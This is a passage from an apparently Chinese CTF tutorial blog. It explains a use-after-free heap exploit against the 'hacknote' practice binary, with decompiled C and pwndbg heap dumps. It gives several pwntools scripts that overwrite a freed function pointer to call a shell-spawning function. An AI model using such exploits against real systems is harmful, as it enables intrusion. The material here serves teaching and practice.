class=\"string\">&quot;Invalid choice&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 != <span class=\"number\">1</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_13;</span><br><span class=\"line\">      add_note();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;       HackNote       &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 1. Add note          &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 2. Delete note       &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 3. Print note        &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 4. Exit              &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your choice :&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>add</p>\n<p>​\t\tnotelist这个链表存储内容,链表的每个节点分了两部分,第一部分4字节,存储print_note_content函数地址,第二部分也是一个指针,指向存储malloc的数据的chunk的地址.</p>\n<p>​\t\t例如申请一个8字节大小的content,会得到</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/image-20230416105824835.png\" alt=\"image-20230416105824835\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">add_note</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _DWORD *v0; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"type\">signed</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [esp+Ch] [ebp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> size; <span class=\"comment\">// [esp+10h] [ebp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [esp+14h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v5; <span class=\"comment\">// [esp+1Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( count &lt;= <span class=\"number\">5</span> )  <span class=\"comment\">//最多分配5个</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">4</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !notelist[i] )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        notelist[i] = <span class=\"built_in\">malloc</span>(<span class=\"number\">8u</span>);  <span class=\"comment\">//分配一个notelist节点</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !notelist[i] )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Alloca Error&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        *(_DWORD *)notelist[i] = print_note_content; <span class=\"comment\">//存储put函数</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Note size :&quot;</span>);</span><br><span class=\"line\">        read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">8u</span>);</span><br><span class=\"line\">        size = atoi(&amp;buf);</span><br><span class=\"line\">        v0 = notelist[i]; <span class=\"comment\">//v0等于notelist的第一个8字节,存储put函数</span></span><br><span class=\"line\">        v0[<span class=\"number\">1</span>] = <span class=\"built_in\">malloc</span>(size); <span class=\"comment\">// v0第二个字节,存储真正要存储的数据</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !*((_DWORD *)notelist[i] + <span class=\"number\">1</span>) ) <span class=\"comment\">//看有没有分配成功?</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Alloca Error&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content :&quot;</span>);</span><br><span class=\"line\">        read(<span class=\"number\">0</span>, *((<span class=\"type\">void</span> **)notelist[i] + <span class=\"number\">1</span>), size);</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Success !&quot;</span>);</span><br><span class=\"line\">        ++count;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v5; <span class=\"comment\">//这是啥??</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Full&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>delete</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">del_note</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [esp+4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v3; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>); <span class=\"comment\">//输入要释放的index</span></span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt;= count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( notelist[v1] ) </span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"type\">void</span> **)notelist[v1] + <span class=\"number\">1</span>));</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(notelist[v1]);  <span class=\"comment\">// 释放后但没有清零!! 漏洞点</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Success&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">print_note</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [esp+4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v3; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt;= count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( notelist[v1] )   <span class=\"comment\">// 释放后仍然可以调用! 漏洞点!!</span></span><br><span class=\"line\">    (*(<span class=\"type\">void</span> (__cdecl **)(<span class=\"type\">void</span> *))notelist[v1])(notelist[v1]);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>​\t\tfree后没有清空notelist的内容,也就是说,还可以继续调用print_note函数,也就是可以调用notelist对应的块的print_note_content函数,如果能够将这个函数修改成后门函数或者system函数的话,就可以getshell.</p>\n<p>​\t\t<font color=\"red\">问题是如何获取这一块空间进行修改呢?</font>, 存储函数地址的这一块空间本质上也是普通的一块堆的空间,可以在释放后重新申请到,所以可以进行释放再申请,但是释放了的话,再申请一次,第一个释放的8字节存放函数地址的chunk还是会被申请为存放函数地址的空间.</p>\n<p>​\t\t不过我们可以最开始连续申请两个notelist,然后再释放,这样的话,第二个notelist存放函数的chunk,就可以被申请作为数据的chunk了</p>\n<p>1.申请note0和note1,大小随意,不是8及以下就行, 如16</p>\n<p>​\t\t不能是8及以下是因为不能和存放函数的chunk进入同一个fastbin的链表,不然会影响,</p>\n<p>​\t\t注意,此时会有4个chunk, 2个是用来存放put和content指针的, 两个是存放数据的</p>\n<p>2.释放note0和note1,这时候有4个bins了,其中0x10大小的就是存放put和content指针的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; bins</span><br><span class=\"line\">fastbins</span><br><span class=\"line\"><span class=\"number\">0x10</span>: <span class=\"number\">0x804b028</span> —▸ <span class=\"number\">0x804b000</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x18</span>: <span class=\"number\">0x804b038</span> —▸ <span class=\"number\">0x804b010</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x20</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x28</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x30</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x38</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\">  </span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><p>申请一个大小为8的note2,这个时候就会分别用到0x10的两个fastbin</p>\n<p><font color=\"red\">而第二个0x10的bin,其实就是note1的存放函数地址的指针</font>,修改为后们函数地址后再通过uaf进行print_note中的函数调用就可以getshell了</p>\n</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; bins</span><br><span class=\"line\">fastbins</span><br><span class=\"line\"><span class=\"number\">0x10</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x18</span>: <span class=\"number\">0x804b038</span> —▸ <span class=\"number\">0x804b010</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x20</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: <span class=\"number\">0x804b000</span></span><br><span class=\"line\">Size: <span class=\"number\">0x11</span></span><br><span class=\"line\"></span><br><span class=\"line\">Free <span class=\"title function_\">chunk</span> <span class=\"params\">(fastbins)</span> | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b010</span><br><span class=\"line\">Size: 0x19</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b028</span><br><span class=\"line\">Size: 0x11</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>此时,我们在申请的这个note2中,填入magic函数的地址,就覆盖了note0的put和content指针,</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x/<span class=\"number\">4</span>wx <span class=\"number\">0x804b000</span></span><br><span class=\"line\"><span class=\"number\">0x804b000</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000011</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x0a616161</span></span><br><span class=\"line\">为什么一开始不是数据呢,一开始是存放的chunk的结构等信息</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>再调用note0的put,就成功调用了magic函数!exp</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./hacknote&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">length,context</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;size&quot;</span>,length)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Content&quot;</span>,context)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,index)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Print</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,index)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">&quot;16&quot;</span>,<span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;16&quot;</span>,<span class=\"string\">b&quot;bbb&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;8&quot;</span>,p32(<span class=\"number\">0x08048986</span>))</span><br><span class=\"line\">Print(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">io.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">io.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">io.recv(<span class=\"number\">1024</span>)</span><br></pre></td></tr></table></figure>\n\n<p>​\t几个细节问题,比如为什么不能用数字什么的,先看看比较官方的exp怎么写的吧</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./hacknote&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">addnote</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delnote</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">printnote</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">magic = <span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;aaaa&quot;</span>) <span class=\"comment\"># add note 0</span></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;ddaa&quot;</span>) <span class=\"comment\"># add note 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">delnote(<span class=\"number\">0</span>) <span class=\"comment\"># delete note 0</span></span><br><span class=\"line\">delnote(<span class=\"number\">1</span>) <span class=\"comment\"># delete note 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">addnote(<span class=\"number\">8</span>, p32(magic)) <span class=\"comment\"># add note 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">printnote(<span class=\"number\">0</span>) <span class=\"comment\"># print note 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t修改自己的exp</p>\n<p>​\t\t1.数字都给加上str() 转换一下就可以了</p>\n<p>​\t\t2.输入的字符串可以把b去了</p>\n<p>这下顺眼多了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./hacknote&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">length,context</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;size&quot;</span>,<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Content&quot;</span>,context)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Print</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(<span class=\"number\">0x08048986</span>))</span><br><span class=\"line\">Print(<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\">#io.recv(1024)</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"泄露libc\"><a href=\"#泄露libc\" class=\"headerlink\" title=\"泄露libc\"></a>泄露libc</h3><p>​\t\t没有后门函数,那就需要泄露libc地址后system、getshell. 把调用的函数地址修改成puts函数的地址,那怎么传参数呢? 参数要用栈,</p>\n<pre><code>    